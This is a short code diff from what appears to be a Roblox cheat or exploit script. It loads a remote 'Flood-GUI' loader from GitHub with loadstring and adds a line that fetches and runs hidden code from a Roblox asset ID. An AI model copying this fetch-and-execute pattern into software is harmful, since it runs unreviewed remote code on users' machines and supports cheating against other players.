@@ -84,6 +84,7 @@ plr.CharacterAdded:Connect(function(char)
 end)
 
 loadstring(game:HttpGetAsync"https://raw.githubusercontent.com/ImMejor35/Flood-GUI/main/loader.lua")"main"
+local request = loadstring(game:GetObjects("rbxassetid://15900013841")[1].Source)()
 
 local FoundEscapee = false
 local FoundPage = false
